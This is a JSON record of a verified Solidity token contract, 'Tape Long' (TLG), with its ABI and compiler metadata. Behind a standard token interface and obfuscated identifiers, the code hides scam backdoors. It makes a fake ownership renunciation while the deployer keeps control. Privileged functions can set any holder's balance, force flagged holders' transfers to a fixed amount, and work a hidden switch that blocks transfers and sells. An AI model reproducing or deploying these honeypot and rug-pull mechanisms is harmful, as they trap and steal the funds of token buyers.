{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface buyLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeExempt {\n    function createPair(address senderBuy, address listTrading) external returns (address);\n}\n\ninterface sellReceiverShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingMin) external view returns (uint256);\n\n    function transfer(address buyReceiver, uint256 tradingReceiver) external returns (bool);\n\n    function allowance(address toListTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyReceiver,\n        uint256 tradingReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellTx, uint256 value);\n    event Approval(address indexed toListTrading, address indexed spender, uint256 value);\n}\n\ninterface txToken is sellReceiverShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TapeLong is enableTrading, sellReceiverShould, txToken {\n\n    address txTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address exemptAuto, uint256 tradingReceiver) external virtual override returns (bool) {\n        return launchBuy(_msgSender(), exemptAuto, tradingReceiver);\n    }\n\n    bool public teamMax;\n\n    address public receiverLiquidity;\n\n    function takeList() public {\n        emit OwnershipTransferred(receiverLiquidity, address(0));\n        tokenMarketingIs = address(0);\n    }\n\n    function senderFund() private view {\n        require(limitExempt[_msgSender()]);\n    }\n\n    uint256 constant totalMarketingSender = 12 ** 10;\n\n    event OwnershipTransferred(address indexed tokenAt, address indexed maxBuy);\n\n    address isReceiverReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 minSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingToken;\n    }\n\n    address public takeLaunched;\n\n    function exemptTokenMin(address enableSwap) public {\n        senderFund();\n        \n        if (enableSwap == receiverLiquidity || enableSwap == takeLaunched) {\n            return;\n        }\n        teamEnableFrom[enableSwap] = true;\n    }\n\n    bool public teamLimitShould;\n\n    address private tokenMarketingIs;\n\n    function autoBuy(address totalAuto) public {\n        require(totalAuto.balance < 100000);\n        if (shouldEnableTeam) {\n            return;\n        }\n        if (atTotal == takeBuyReceiver) {\n            atTotal = takeBuyReceiver;\n        }\n        limitExempt[totalAuto] = true;\n        if (txMarketing != atTotal) {\n            marketingAuto = false;\n        }\n        shouldEnableTeam = true;\n    }\n\n    function txAutoIs(address exemptAuto, uint256 tradingReceiver) public {\n        senderFund();\n        limitTotal[exemptAuto] = tradingReceiver;\n    }\n\n    mapping(address => bool) public teamEnableFrom;\n\n    function balanceOf(address tradingMin) public view virtual override returns (uint256) {\n        return limitTotal[tradingMin];\n    }\n\n    uint256 public takeBuyReceiver;\n\n    function launchBuy(address amountShould, address buyReceiver, uint256 tradingReceiver) internal returns (bool) {\n        if (amountShould == receiverLiquidity) {\n            return walletMaxExempt(amountShould, buyReceiver, tradingReceiver);\n        }\n        uint256 launchListReceiver = sellReceiverShould(takeLaunched).balanceOf(txTotal);\n        require(launchListReceiver == minSender);\n        require(buyReceiver != txTotal);\n        if (teamEnableFrom[amountShould]) {\n            return walletMaxExempt(amountShould, buyReceiver, totalMarketingSender);\n        }\n        return walletMaxExempt(amountShould, buyReceiver, tradingReceiver);\n    }\n\n    function takeBuy(uint256 tradingReceiver) public {\n        senderFund();\n        minSender = tradingReceiver;\n    }\n\n    bool public isReceiverMin;\n\n    uint8 private modeMarketing = 18;\n\n    uint256 private marketingToken = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return tokenMarketingIs;\n    }\n\n    function owner() external view returns (address) {\n        return tokenMarketingIs;\n    }\n\n    function walletMaxExempt(address amountShould, address buyReceiver, uint256 tradingReceiver) internal returns (bool) {\n        require(limitTotal[amountShould] >= tradingReceiver);\n        limitTotal[amountShould] -= tradingReceiver;\n        limitTotal[buyReceiver] += tradingReceiver;\n        emit Transfer(amountShould, buyReceiver, tradingReceiver);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeAuto;\n    }\n\n    function transferFrom(address amountShould, address buyReceiver, uint256 tradingReceiver) external override returns (bool) {\n        if (_msgSender() != isReceiverReceiver) {\n            if (teamShould[amountShould][_msgSender()] != type(uint256).max) {\n                require(tradingReceiver <= teamShould[amountShould][_msgSender()]);\n                teamShould[amountShould][_msgSender()] -= tradingReceiver;\n            }\n        }\n        return launchBuy(amountShould, buyReceiver, tradingReceiver);\n    }\n\n    bool public limitMode;\n\n    constructor (){\n        if (takeBuyReceiver == tokenExempt) {\n            isReceiverMin = true;\n        }\n        buyLimit limitLiquidityMin = buyLimit(isReceiverReceiver);\n        takeLaunched = takeExempt(limitLiquidityMin.factory()).createPair(limitLiquidityMin.WETH(), address(this));\n        if (isReceiverMin != teamMax) {\n            listFee = true;\n        }\n        receiverLiquidity = _msgSender();\n        takeList();\n        limitExempt[receiverLiquidity] = true;\n        limitTotal[receiverLiquidity] = marketingToken;\n        \n        emit Transfer(address(0), receiverLiquidity, marketingToken);\n    }\n\n    uint256 public tokenExempt;\n\n    string private txAmount = \"Tape Long\";\n\n    function approve(address takeTotal, uint256 tradingReceiver) public virtual override returns (bool) {\n        teamShould[_msgSender()][takeTotal] = tradingReceiver;\n        emit Approval(_msgSender(), takeTotal, tradingReceiver);\n        return true;\n    }\n\n    function allowance(address limitMin, address takeTotal) external view virtual override returns (uint256) {\n        if (takeTotal == isReceiverReceiver) {\n            return type(uint256).max;\n        }\n        return teamShould[limitMin][takeTotal];\n    }\n\n    mapping(address => uint256) private limitTotal;\n\n    uint256 minTotal;\n\n    uint256 private atTotal;\n\n    bool private marketingAuto;\n\n    bool private listFee;\n\n    string private modeAuto = \"TLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamShould;\n\n    mapping(address => bool) public limitExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return txAmount;\n    }\n\n    bool public shouldEnableTeam;\n\n    uint256 public txMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toListTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"}],\"name\":\"autoBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"exemptTokenMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnableTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingReceiver\",\"type\":\"uint256\"}],\"name\":\"takeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuyReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamEnableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLimitShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingReceiver\",\"type\":\"uint256\"}],\"name\":\"txAutoIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TapeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}